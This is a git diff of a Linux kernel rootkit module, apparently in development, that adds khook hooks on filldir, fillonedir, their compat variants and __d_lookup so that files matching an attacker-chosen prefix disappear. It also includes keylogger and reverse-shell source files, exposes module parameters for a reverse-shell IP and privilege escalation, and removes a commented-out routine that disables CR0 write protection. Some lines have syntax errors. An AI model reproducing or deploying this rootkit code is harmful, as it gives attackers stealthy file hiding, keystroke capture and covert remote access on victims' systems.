@@ -9,7 +9,6 @@
 #include <linux/kernel.h>
 #include <linux/module.h>
 #include <linux/timer.h>
-// #include <include/linux/string.h>
 #include "arsenal/keylogger.c"
 #include "arsenal/reverse-shell.c"
 #include "khook/engine.c"
@@ -36,8 +35,9 @@ typedef struct timer_list _timer;
 
 typedef struct commands {
     // TODO: Add properties for each of the commands we can accept
-    char* rev_shell_ip;
-    char* hidden_file_prefix;
+    char *rev_shell_ip;
+    // TODO: Add toggle for enabling and disabling hidden files.
+    char *hidden_file_prefix;
     bool escalate_privs;
     bool keylogger;
 } commands;
@@ -58,10 +58,10 @@ struct commands cmds;
  * intermittently and do things when it changes.
  **/
 
-static char* rev_shell_ip = NULL;
+static char *rev_shell_ip = NULL;
 module_param(rev_shell_ip, charp, 0770);
 MODULE_PARM_DESC(rev_shell_ip, "IP Address for reverse shell.");
-static char* hidden_file_prefix = NULL;
+static char *hidden_file_prefix = NULL;
 module_param(hidden_file_prefix, charp, 0770);
 MODULE_PARM_DESC(hidden_file_prefix, "Prefix for hidden files.");
 static bool escalate_privileges = false;
@@ -83,26 +83,13 @@ static void poll_for_commands(unsigned long data);
  * // TODO: Fix
  */
 
-void log_info(const char* message) {
+void log_info(const char *message) {
     printk(KERN_INFO "%s %s", "GARDEN:", message);
 }
 
-void log_error(const char* message) {
+void log_error(const char *message) {
     printk(KERN_ERR "GARDEN: %s", message);
 }
-
-// TODO: Figure out if this is needed at all.
-// /**
-//  * Overwrite the 16th bit in the CR0 register to disable write protection.
-//  */
-// void disable_write_protection() {
-//     unsigned long value;
-//     asm volatile("mov %%cr0,%0" : "=r"(value));
-//     if (value & 0x00010000) {
-//         value &= ~0x00010000;
-//                 asm volatile("mov %0,%%cr0" ::"r"(value));
-//     }
-// }
 
 /**
  * Syscall hooks
@@ -118,12 +105,75 @@ static int khook_fget(unsigned int fd) {
 **/
 
 // Example hook for testing build process.
-KHOOK(inode_permission);
-static int khook_inode_permission(struct inode* inode, int mask) {
-    int ret = 0;
-    ret = KHOOK_ORIGIN(inode_permission, inode, mask);
-    printk("%s(%p, %08x) = %d\n", __func__, inode, mask, ret);
-    return ret;
+// KHOOK(inode_permission);
+// static int khook_inode_permission(struct inode *inode, int mask) {
+//     int ret = 0;
+//     ret = KHOOK_ORIGIN(inode_permission, inode, mask);
+//     printk("%s(%p, %08x) = %d\n", __func__, inode, mask, ret);
+//     return ret;
+// }
+
+/**
+ * Hide files and directories.
+ */
+
+/**
+ * If this method returns true, the file in question should be hidden.
+ */
+static bool should_hide_file(const char *name) {
+    printk(KERN_INFO "Determining if should hide: %s\n", name);
+    if (hidden_file_prefix && !strncmp(name, hidden_file_prefix, strlen(hidden_file_prefix))) {
+        return true;
+    }
+    return false
+}
+
+KHOOK_EXT(int, fillonedir, void *, const char *, int, loff_t, u64, unsigned int);
+static int khook_fillonedir(void *__buf, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type) {
+    if (should_hide_file(name)) {
+        return 0;
+    }
+    return KHOOK_ORIGIN(fillonedir, __buf, name, namlen, offset, ino, d_type);
+}
+
+KHOOK_EXT(int, filldir, void *, const char *, int, loff_t, u64, unsigned int);
+static int khook_filldir(void *__buf, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type) {
+    if (should_hide_file(name)) {
+        return 0;
+    }
+    return KHOOK_ORIGIN(filldir, __buf, name, namlen, offset, ino, d_type);
+}
+
+KHOOK_EXT(int, filldir64, void *, const char *, int, loff_t, u64, unsigned int);
+static int khook_filldir64(void *__buf, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type) {
+    if (should_hide_file(name)) {
+        return 0;
+    }
+    return KHOOK_ORIGIN(filldir64, __buf, name, namlen, offset, ino, d_type);
+}
+
+KHOOK_EXT(int, compat_fillonedir, void *, const char *, int, loff_t, u64, unsigned int);
+static int khook_compat_fillonedir(void *__buf, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type) {
+    if (should_hide_file(name)) {
+        return 0;
+    }
+    return KHOOK_ORIGIN(compat_fillonedir, __buf, name, namlen, offset, ino, d_type);
+}
+
+KHOOK_EXT(int, compat_filldir, void *, const char *, int, loff_t, u64, unsigned int);
+static int khook_compat_filldir(void *__buf, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type) {
+    if (should_hide_file(name)) {
+        return 0;
+    }
+    return KHOOK_ORIGIN(compat_filldir, __buf, name, namlen, offset, ino, d_type);
+}
+
+KHOOK_EXT(struct dentry *, __d_lookup, const struct dentry *, const struct qstr *);
+struct dentry *khook___d_lookup(const struct dentry *parent, const struct qstr *name) {
+    if (should_hide_file(name->name) {
+        return NULL;
+	}
+    return KHOOK_ORIGIN(__d_lookup, parent, name);
 }
 
 /**
@@ -132,14 +182,14 @@ static int khook_inode_permission(struct inode* inode, int mask) {
  */
 
 #if (LINUX_VERSION_CODE >= KERNEL_VERSION(4, 15, 0))
-static void legacy_timer_function_wrapper(struct timer_list* timer) {
-    struct legacy_timer_emu* legacy_timer = from_timer(legacy_timer, timer, t);
-    // legacy_timer->data is currently always NULL
+static void legacy_timer_function_wrapper(struct timer_list *timer) {
+    struct legacy_timer_emu *legacy_timer = from_timer(legacy_timer, timer, t);
+    // NOTE: legacy_timer->data is currently always NULL, but may not be in the future.
     legacy_timer->function(legacy_timer->data);
 }
 #endif
 
-__inline void timer_init_wrapper(_timer* timer, void* func) {
+__inline void timer_init_wrapper(_timer *timer, void *func) {
     timer->data = 0;
     timer->function = func;
 #if (LINUX_VERSION_CODE >= KERNEL_VERSION(4, 15, 0))
@@ -149,7 +199,7 @@ __inline void timer_init_wrapper(_timer* timer, void* func) {
 #endif
 }
 
-__inline static void set_timer(_timer* timer) {
+__inline static void set_timer(_timer *timer) {
     unsigned long expires = jiffies + msecs_to_jiffies(POLLING_INTERVAL);
 #if (LINUX_VERSION_CODE >= KERNEL_VERSION(4, 15, 0))
     mod_timer(&timer->t, expires);
@@ -159,7 +209,7 @@ __inline static void set_timer(_timer* timer) {
     printk("Timer configured to go off at %lu jiffies, in %lu msecs\n", expires, msecs_to_jiffies(POLLING_INTERVAL));
 }
 
-__inline static void timer_cleanup_wrapper(_timer* timer) {
+__inline static void timer_cleanup_wrapper(_timer *timer) {
 #if (LINUX_VERSION_CODE >= KERNEL_VERSION(4, 15, 0))
     del_timer_sync(&timer->t);
 #else
@@ -182,11 +232,10 @@ static void poll_for_commands(unsigned long data) {
         // TODO: Set up reverse shell.
     }
 
-    if (hidden_file_prefix != cmds.hidden_file_prefix) {
-        printk(KERN_INFO "hidden_file_prefix updated: %s\n", rev_shell_ip);
-        cmds.hidden_file_prefix = hidden_file_prefix;
-        // TODO: Set up hidden files.
-    }
+    // if (hidden_file_prefix != cmds.hidden_file_prefix) {
+    //     printk(KERN_INFO "hidden_file_prefix updated: %s\n", rev_shell_ip);
+    //     cmds.hidden_file_prefix = hidden_file_prefix;
+    // }
 
     // if (escalate_privileges) {
     //     get_root();
@@ -195,7 +244,7 @@ static void poll_for_commands(unsigned long data) {
     set_timer(&polling_timer);
 }
 
-static void copy_params_into_cmd_struct(commands* cmd) {
+static void copy_params_into_cmd_struct(commands *cmd) {
     cmd->rev_shell_ip = rev_shell_ip;
     cmd->hidden_file_prefix = hidden_file_prefix;
     cmd->escalate_privs = escalate_privileges;
